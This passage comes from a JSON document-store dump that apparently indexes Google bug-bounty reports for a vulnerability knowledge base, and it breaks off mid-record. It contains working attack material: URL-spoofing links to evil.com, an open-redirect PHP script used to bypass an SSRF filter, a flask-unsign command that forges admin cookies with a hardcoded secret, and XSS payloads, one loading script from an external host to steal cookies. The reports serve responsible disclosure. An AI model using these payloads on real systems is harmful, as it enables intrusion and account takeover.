methods.\r\nPOC6:\r\nftp://google.com:\\@evil.com\r\n-> Result  =\r\nftp://google.com:\\@evil.com\r\nPOC7:\r\nhttp://google.com:\\@2130706433\r\n-> Result =\r\nhttp://google.com:\\@2130706433\r\nPOC8:\r\n<ftp://google.com@evil.com>\r\n-> Result =\r\nftp://google.com@evil.com\r\nPOC9:\r\n<ftp:/google.com@evil.com>\r\n-> Result =\r\nftp:/google.com@evil.com\r\nPOC10:\r\n[http://google.com](ftp://google.com@evil.com)\r\n-> Result =\r\nhttp://google.com\r\nPOC11:\r\n[http://google.com](ftp:/google.com@evil.com)\r\n-> Result =\r\nhttp://google.com\r\nPOC12:\r\n[google.com](ftp:%67%6f%6f%67%6c%65%2e%63%6f%6d@%65%76%69%6c%2e%63%6f%6d)\r\n-> Result =\r\ngoogle.com\r\nReference:\r\nhttps://hackerone.com/reports/113070\r\nAttack Scenario:\r\nAttackers may be able to trick the triage team members with these manipulated links.\r\nAlso don't forget about the tab-nabbing attack, attackers may be able to redirect one of the triage team members to their malicious server or steal some sensitive information!\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 2358, "end_char_idx": 4021, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "b649884d-1020-4150-8fe0-60e6c2d161cb": {"__data__": {"id_": "b649884d-1020-4150-8fe0-60e6c2d161cb", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_181365.txt", "file_name": "20250408_175708_181365.txt", "file_type": "text/plain", "file_size": 3415, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "d198b9b6-6405-4299-8c9e-966e575abc01", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_181365.txt", "file_name": "20250408_175708_181365.txt", "file_type": "text/plain", "file_size": 3415, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "5c0a04c3a28578980b6c72ef155bfc97b5b18bd55034d7a7b4fb5337e934aec1", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nServer side request forgery fix bypass for report 208732630\r\nReported by:\r\nBasavaraj Banakar\r\nGoogle VRP\r\ntriaged\r\n15:40 | Apr 28, 2022\r\naccepted\r\n00:11 | Apr 30, 2022\r\nfixed\r\n19:12 | Nov 5, 2022\r\nreward decided\r\n$500\r\nSummary:\r\nServer side request forgery fix bypass for report 208732630\r\nProduct:\r\nappsheet.com\r\nURL:\r\nhttps://www.appsheet.com/Account/ApigeeAuthInfo\r\nVulnerability type:\r\nInformation Leak\r\nDetails\r\nHi team,\r\nHope everything going fine on your side, I have found an bypass for report\r\nhttps://issuetracker.google.com/issues/208732630\r\nVulnerability\r\n: SSRF Fix Bypass for report 208732630\r\nDescription\r\n: Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location.\r\nIn a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials.\r\nAffected URL\r\n:\r\nhttps://www.appsheet.com/Account/ApigeeAuthInfo\r\nType of Bypass\r\n: Using url redirection technique\r\nSteps to reproduce\r\n:\r\nNavigate to appsheet.com & login using google Oauth\r\nNow navigate to My account --> Data sources --> new data source --> select apigee\r\nHere if we enter any url in 'OpenAPI Spec URL' it will fetch it from server side and displays the output for frontend\r\nNow if I tried to fetch localhost or 127.0.0.1 it says url not allowed(because its blacklisted).\r\nNow these filters can be bypassed using redirection technique.\r\nexample here is my server i.e attacker server\r\nhttps://basubanakar.com\r\nhere I have an php code that requires get parameter url as input and it will redirect users to that url\r\nhere is a code of getredir.php\r\n<?php\r\n $redir = $_GET['url'];\r\n header(\"Location: $redir\");\r\n?>\r\nfor example if I navigate to\r\nhttps://www.basubanakar.com/getredir.php?url=http://localhost\r\nThis above request will redirect me to\r\nhttp://localhost\r\nNow will add the above url in 'OpenAPI Spec URL' i.e\r\nhttps://www.basubanakar.com/getredir.php?url=http://localhost\r\nNow this request will make redirection on server side of appsheet and that will automatically redirects to localhost\r\nBy using FFUF I have automated the process to find the other webservices running on other ports of localhost.\r\nhttps://www.basubanakar.com/getredir.php?url=http://localhost:80\r\nhttps://www.basubanakar.com/getredir.php?url=http://localhost:20202\r\nI have found two webservices running on two ports of localhost 80,20202\r\n80- serves the same webpage of appsheet\r\n20202- serves the 'Fluent bit prometheus exporter'\r\nProof of concept\r\n: check the below video\r\nhttps://drive.google.com/file/d/1N7dIuBFbv3vkAFHY5al6FPtvP_wvUMb9/view?usp=sharing\r\nRoot cause\r\n: because the redirection is found on server side of appsheet, and also the post redirected url is not validated .\r\nThanks & Regards,\r\nBasavaraj.\r\nAttack scenario\r\nHere anybody can exploit the vulnerability and they can gain access to any internal web services running on localhost and also other internal hosts to and one more main thing is as an attacker they are able brute force the internal webservers by using this technique\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3399, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "f342f81c-1808-4e96-b65b-c14bd672a0ac": {"__data__": {"id_": "f342f81c-1808-4e96-b65b-c14bd672a0ac", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_228658.txt", "file_name": "20250408_175708_228658.txt", "file_type": "text/plain", "file_size": 3487, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "ccd9a8a0-1bd6-49b5-871e-9a31e61dabbf", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_228658.txt", "file_name": "20250408_175708_228658.txt", "file_type": "text/plain", "file_size": 3487, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "78fc78d2e0b3d8a62ec52543cbf36dba57925055242e9e06f9bf248708f2fb7f", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nPrivilege escalation in Airflow created by GCP Composer due to hardcoded secret_key\r\nGoogle VRP\r\ntriaged\r\n00:55 | Mar 29, 2022\r\naccepted\r\n21:54 | Apr 12, 2022\r\nfixed\r\n18:06 | Sep 7, 2022\r\nSummary:\r\nPrivilege escalation in Airflow created by GCP Composer due to hardcoded secret_key\r\nProduct:\r\nGoogle Cloud\r\nVulnerability type:\r\nPrivilege Escalation\r\nDetails\r\nWhen a new\r\nComposer environment\r\nis generated in Composer, the\r\nsame secret_key is always used: \"some-random-id\"\r\n.\r\nThe name already indicates that the key\r\nshould be something random\r\n, but it's actually the string \"some-random-id\". I also couldn't find any documentation about this secret key used by Composer, nor any place where it's indicated that it should be changed or how to change it.\r\nThis key is actually the\r\nsecret used by flaks to sign the auth cookies\r\n.\r\nThis means that\r\nanyone with access to the Apache Airflow\r\ninstance generated by Composer will be able to impersonate any other user. So for example, someone with\r\nViewer\r\naccess (this role doesn't doesn't even grant view access over the configuration) is going to be able to *\r\nsign a valid cookie with a different user_id *\r\nwith more privileges to escalate privileges.\r\nNote that the\r\nCVE-2020-17526 is similar\r\nto this vulnerability, the only difference is that GCP instead of using the default Airflow password has\r\nhardcoded its own one\r\n.\r\nThe only thing preventing this from being a\r\ncomplete Take Over of all the Apache Airflow environments\r\ncreated by Composer is the fact that GCP first checks if the GCP user has access to the environment. Please, let me know if I'm wrong in the previous sentence, as if it's possible for a GCP unauthenticated user to access the Apache Airflow web consoles, he will be potentially able to compromise them knowing this secret.\r\nAttack scenario\r\nFor example, let's suppose there is a user with View access to an Apache Airflow instance created by Composer. This privilege might have been given to the user with:\r\ngcloud composer environments run <airflow-env> \\\r\n--location us-central1 users create -- \\\r\n-u accounts.google.com:<user-account> \\\r\n-e somestring \\\r\n-f somestring \\\r\n-l - -r Viewer --use-random-password\r\nNow, when that user log-in his\r\nvisibility is going to be be very limited\r\n(he cannot even see the config).\r\nHowever, the\r\nuser knows that the flask secret key is \"some-random-id\".\r\nSo, he can craft a new cookie with the user_id \"1\" (as it's potentially the most privileged one):\r\nflask-unsign --sign --secret 'some-random-id' --cookie \"{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}\"\r\nUsing the cookie generated by the previous code the viewer user will impersonate the user with id \"1\" effectively escalating privileges.\r\nThe previous example was explained with a user with role Viewer, but this issue can be\r\nexploited with any other role, including Public role\r\n(which is a role that doesn't grant any type of permission over the Airflow console).\r\ngcloud composer environments run <airflow-env> \\\r\n--location us-central1 users create -- \\\r\n-u accounts.google.com:<user-account> \\\r\n-e somestring \\\r\n-f somestring \\\r\n-l - -r Public --use-random-password\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3471, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "06d87ce0-76ee-48a8-a291-2a8e5ee44ff4": {"__data__": {"id_": "06d87ce0-76ee-48a8-a291-2a8e5ee44ff4", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_323925.txt", "file_name": "20250408_175710_323925.txt", "file_type": "text/plain", "file_size": 1178, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "d822a52e-52df-4b79-950a-27c3c5df989a", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_323925.txt", "file_name": "20250408_175710_323925.txt", "file_type": "text/plain", "file_size": 1178, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "2f9130ad30b4e60a28b7067c30e50c5103ba8076e005c50fdecb8d39833cd3f2", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nWebsite inconstiancy because of malicious code\r\nReported by:\r\nVishal Patil\r\nGoogle VRP\r\ntriaged\r\n22:52 | Mar 17, 2022\r\naccepted\r\n10:29 | Mar 18, 2022\r\nfixed\r\n15:03 | Apr 30, 2022\r\nGoogle comment\r\nThis vulnerability would more correctly be described as an HTML injection.\r\nSummary:\r\nWebsite inconstiancy because of malicious code\r\nProduct:\r\nGoogle Transparency Report\r\nURL:\r\nhttps://transparencyreport.google.com/copyright/owners/169376\r\nVulnerability type:\r\nunknown\r\nDetails\r\nif you store such  such script in website ->\r\n\">.txt \"> '> \"> \"> \"onmouseover=\"alert(7); \"onmouseover='prompt(969601)'bad=\">\r\nit trying to execute and after every 1 second page will start up-down and lagging because of this code trying to execute. ( tested in firefox  browser 91.5.0esr (64-bit))\r\nAttack scenario\r\nif you store such  such script in website ->\r\n\">.txt \"> '> \"> \"> \"onmouseover=\"alert(7); \"onmouseover='prompt(969601)'bad=\">\r\nit trying to execute and after every 1 second page will start up-down and lagging because of this code trying to execute. ( tested in firefox  browser 91.5.0esr (64-bit))  .\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1162, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "c2ed619e-dd70-472a-b66f-7952ad164c59": {"__data__": {"id_": "c2ed619e-dd70-472a-b66f-7952ad164c59", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_372239.txt", "file_name": "20250408_175710_372239.txt", "file_type": "text/plain", "file_size": 1048, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "63db19e4-93f8-4ac9-88a7-d160c4962737", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_372239.txt", "file_name": "20250408_175710_372239.txt", "file_type": "text/plain", "file_size": 1048, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "5167fce78b676a1c3441e2e5ab10ed4dd9f79c48a37501fb3f81f12f65a1ef4c", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in https://opensourcelive.withgoogle.com\r\nReported by:\r\nShivam Singh KiNg\r\nGoogle VRP\r\nclosed\r\n17:17 | Mar 14, 2022\r\ntriaged\r\n05:32 | Mar 18, 2022\r\naccepted\r\n10:20 | Mar 18, 2022\r\nfixed\r\n19:55 | Apr 7, 2022\r\nreward decided\r\n$500\r\nSummary: The issue here is that the vulnerable webapplication doesn\u2019t check if the endpoint URL provided the value\r\nVulnerable Domain:\r\nhttps://opensourcelive.withgoogle.com\r\nStep to Reproduce this vulnerability:\r\nLogin your account, Already Done\r\nGo to profile -> Account Setting\r\nClick Update Email and Intercept The Request into Burpsuit\r\nChange Request Method PUT To GET\r\nthe URL Endpoint->api/user_profiles/{injection-point} Enter Any user profile id\r\nYou Got the User-Email-id, FirstName, Lastname\r\nPOC Video LInk->\r\nhttps://www.youtube.com/watch?v=KZ1mJwvmA_g\r\nAttack scenario:\r\nAttacker Got the user information just like for example: -User-Email id, First name. Last Name as a lead an Information Disclosure\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1030, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "38695fc6-bc79-4993-beee-77e52f8890af": {"__data__": {"id_": "38695fc6-bc79-4993-beee-77e52f8890af", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_404463.txt", "file_name": "20250408_175710_404463.txt", "file_type": "text/plain", "file_size": 1647, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "a83b156e-7852-47b7-8349-4f6acd5ebc78", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_404463.txt", "file_name": "20250408_175710_404463.txt", "file_type": "text/plain", "file_size": 1647, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "1d4275142f136632733c48cc7c15921c81f4d2403cd1717012744f50ff1f525c", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in siemplify.co\r\nReported by:\r\nAli Hassan Khan\r\nGoogle VRP\r\ntriaged\r\n16:05 | Mar 7, 2022\r\naccepted\r\n16:42 | Mar 7, 2022\r\nfixed\r\n15:20 | Mar 23, 2022\r\nGoogle comment\r\nThis issue was not rewarded, as it was reported during the\r\n6-month blackout period\r\nthat applies to recent acquisitions.\r\nSummary: Sensitive Information Disclosure by .json file\r\nSteps to reproduce:\r\nGo to any web-browser (I prefer chrome and firefox) .\r\nOpen Each Bug Url link in your web browser. (Given below)\r\nExposed information will be seen in your browser (Check image POC for further information).\r\nBug url :\r\nhttps://fileserv.siemplify.co/composer.json\r\nhttps://fileserv.siemplify.co/package-lock.json\r\nhttps://fileserv.siemplify.co/package.json\r\nhttps://fileserv.siemplify.co/vendor/composer/installed.json\r\nhttps://mitre.siemplify.co/web.config\r\nBrowser/OS: Firefox and Chrome\r\nSummary :\r\nI have found some files that might disclose some juicy and critical information like name, id, etc (Sensitive file disclosure) .\r\nRedemption :\r\nIf these files are not in use, then these files should be removed or put a limitation to access for external users.\r\nAttack scenario:\r\nSome juicy information that might help an attacker in information gathering about organization and might also contain some sensitive data.\r\nAttacker can user these valuable information for advance attack as brute-force login.\r\nIt is possible to get all the users registered on the system and create a brute-force directed to these users.\r\nAcquisition info:\r\nhttps://www.crunchbase.com/organization/siemplify\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1631, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "3c588ecf-ebe2-4559-8729-3c32abb989d8": {"__data__": {"id_": "3c588ecf-ebe2-4559-8729-3c32abb989d8", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_435889.txt", "file_name": "20250408_175710_435889.txt", "file_type": "text/plain", "file_size": 1352, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "5bd326b8-12b7-4556-8a39-ac4dfac6afc5", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_435889.txt", "file_name": "20250408_175710_435889.txt", "file_type": "text/plain", "file_size": 1352, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "03bb9a6bfd251f407daa17962db400574f45bfc719d6c8d304710e152bc85990", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nHTML Injection (Possible Reflected XSS)\r\nReported by:\r\nKutluhan\r\nGoogle VRP\r\nclosed\r\n17:07 | Feb 9, 2022\r\naccepted\r\n23:49 | Feb 11, 2022\r\nfixed\r\n00:33 | Mar 11, 2022\r\nGoogle comment\r\nThis vulnerability would more correctly be described as an HTML injection.\r\nSummary:\r\nHTML Injection (Possible Reflected XSS)\r\nProduct:\r\nhttps://bughunters.google.com/\r\nURL:\r\nhttps://bughunters.google.com/\r\nVulnerability type:\r\nOther\r\nDetails\r\nThis is my first google report so sorry for the mess\r\nTarget :\r\nhttps://bughunters.google.com/learn/search\r\nParameter : ?q=\r\nhttps://bughunters.google.com/learn/search?q=PAYLAODSHERE\r\nTested : \r\n<h1,h2,h3,h4,h5,h6> <p><img> <a> <br><i><b> TAGS\r\nPayload  :\r\n\"<img src=\r\nPayload  : \r\n<a href=\"WEBSITELINK\">Pwdec / HTML Injection</a>\r\nhttps://bughunters.google.com/learn/search?q=%3Cimg%20src%3Dhttps:%2F%2Fkutluhancorut.com.tr%2Fwp-content%2Fuploads%2F2021%2F02%2F134066167_142180421002724_2392877025167477926_n.jpg%3E\r\nhttps://bughunters.google.com/learn/search?q=%3Ca%20href%3D%22https:%2F%2Fkutluhancorut.com.tr%2F%22%3EPwdec%20%2F%20HTML%20Injection%3C%2Fa%3E\r\nhttps://bughunters.google.com/learn/search?q=%3Ch1%3Epart1%3C%2Fh1%3E%3Ch2%3Epart2%3C%2Fh2%3E%3Ch3%3Epart3%3C%2Fh3%3E\r\nAttack scenario\r\nPhishing\r\nAbusing other user\r\nDefacing\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1336, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "103db1be-a449-4684-83d0-f7c29edb0f88": {"__data__": {"id_": "103db1be-a449-4684-83d0-f7c29edb0f88", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_483335.txt", "file_name": "20250408_175710_483335.txt", "file_type": "text/plain", "file_size": 4958, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "93a3a32d-d3bc-4214-96f4-d68090eeae27", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_483335.txt", "file_name": "20250408_175710_483335.txt", "file_type": "text/plain", "file_size": 4958, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "a9503cd41b150bc220a969362054527411474c3f99a4eb61fcd459f28c58df74", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "d4a5bb6b-2990-4579-8f55-67df7bedd915", "node_type": "1", "metadata": {}, "hash": "c3b2f4ae2aaa090003743eefcf8c783e036ea76b7191742e3b18adb8e501acc6", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAccount takeover via DOM XSS with user interaction\r\nGoogle VRP\r\ntriaged\r\n16:56 | Feb 3, 2022\r\nclosed\r\n06:18 | Feb 10, 2022\r\naccepted\r\n05:13 | Feb 12, 2022\r\nfixed\r\n08:27 | Mar 21, 2022\r\nreward decided\r\n$100\r\nGoogle comment\r\nThe reward amount is based on the fact that Fitbit (at the time of the report) was considered to be a so-called\r\nnon-integrated acquisition\r\n.\r\nSummary:\r\nAccount takeover via DOM XSS with user interaction\r\nProduct:\r\nFitbit\r\nURL:\r\nhttps://healthsolutions.fitbit.com/news/\r\nVulnerability type:\r\nunknown\r\nDetails\r\nThe site\r\nhttps://healthsolutions.fitbit.com/news/\r\nhas a search feature. When we search something on this site it does not load the results from server, but passes the search term to\r\ndangerous DOM Sinks\r\nsuch as\r\njQuery.after() and element.innerHTML\r\nand renders the result. This makes the site vulnerable to cross site scripting which can be used to steal cookies using document.cookie or deface the site using iframe tags.\r\nA simple payload such as\r\n<script>alert(document.cookie)</script>\r\nor one with my server such as\r\n<script src=https://tzh.xss.ht></script>\r\nis enough to steal the cookies of the victim and cause account takeover since the\r\ncookies are same as that of\r\nmain domain\r\nwith additional cookies specific to wordpress\r\nWhile performing this attack I've noticed that both jQuery.after() and element.innerHTML acts as sinks but portswigger\r\nsays\r\nelement.innerHTML does not accept tags like script, svg on any modern browser . So I think the main problem here is jQuery.after() which allows simple scripts such as\r\n<script src=https://tzh.xss.ht></script>\r\nto be executed.\r\nSince X-Frame-Options protection is there I couldn't turn this vulnerability into zero click account takeover using clickjacking and url parameters are not loaded into the script so no to reflected+DOM vulnerability as well. But there are still other\r\ntwo methods\r\nto cause account takeover via this vulnerability, I'll detail them below\r\nOne easy option to cause zero user interaction  account takeover using malicious extensions to pass the malicious script into search field. This could result in zero click account takeover.\r\nAnother method requires user interaction like luring the victim user into pasting the payload into search field. In real world scenario this method is easier to do. Since vulnerability programs don't allow performing such kind of exploitation I'm just reporting this as possible attack scenario.\r\nSince this is a\r\nWordpress based\r\nwebsite this also allows\r\nWordpress Admin account takeover\r\n. I'm detailing it below:\r\nWordpress's metadata endpoint\r\nhttps://healthsolutions.fitbit.com/wp-json/wp/v2/users\r\ndiscloses admin usernames via\r\nslug\r\nattribute. I enumerated usernames and emails by incrementally going through all /users/[1-80] endpoints\r\nSome users' \"slug\" attribute had hyphens but I was able to convert them into valid\r\nusernames or Emails\r\nby replacing hyphens with either a dot or an @\r\nOne can easily find out whether these enumerated usernames/emails are valid by the error message shown when entering a random password with these username/emails in\r\nhttps://healthsolutions.fitbit.com/wp-admin\r\n. The list of usernames and emails I enumerated using this technique are given below:\r\nUsernames\r\n[REDACTED_USERNAME], [REDACTED_USERNAME], [REDACTED_USERNAME], [REDACTED_USERNAME], [REDACTED_USERNAME], [REDACTED_USERNAME], [REDACTED_USERNAME], [REDACTED_USERNAME], [REDACTED_USERNAME], [REDACTED_USERNAME]\r\nEmails\r\n[REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@gmail.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com\r\nNow it's easy to send a targeted phishing mail to these emails which have elevated privilege and if successful this could lead into wp-admin access as well.\r\nI searched the enumerated wp-admin mails on haveibeenpwned.com and found the following emails to be pwned in previous data breaches.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 4145, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "d4a5bb6b-2990-4579-8f55-67df7bedd915": {"__data__": {"id_": "d4a5bb6b-2990-4579-8f55-67df7bedd915", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_483335.txt", "file_name": "20250408_175710_483335.txt", "file_type": "text/plain", "file_size": 4958, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "93a3a32d-d3bc-4214-96f4-d68090eeae27", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_483335.txt", "file_name": "20250408_175710_483335.txt", "file_type": "text/plain", "file_size": 4958, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "a9503cd41b150bc220a969362054527411474c3f99a4eb61fcd459f28c58df74", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "103db1be-a449-4684-83d0-f7c29edb0f88", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_483335.txt", "file_name": "20250408_175710_483335.txt", "file_type": "text/plain", "file_size": 4958, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "d8f1d9902b00fff97504812f6c3ade60868a5046212b5563b09e9e725ff7cf8a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "I searched the enumerated wp-admin mails on haveibeenpwned.com and found the following emails to be pwned in previous data breaches.\r\n[REDACTED_USERNAME]@gmail.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com, [REDACTED_USERNAME]@fitbit.com,\r\nBreached emails are the regular target of hackers who do attacks like credential stuffing\r\nEven without these emails one can target normal fitbit users as the cookies are same for main domain.\r\nAttack scenario\r\nHackers who do phishing can easily lure people into believing they are doing something totally normal since it's just a search field.\r\nAny novice hacker can exploit this vulnerability since the attack scenario is very simple. Just input a malicious script into search field\r\nThey can cause account takeover of both normal fibit users and admin users of this wordpress page\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 4013, "end_char_idx": 4942, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "0f0cd648-11be-415a-9948-d9f2507c9d5c": {"__data__": {"id_": "0f0cd648-11be-415a-9948-d9f2507c9d5c", "embedding": null, "metadata": {"file_path": 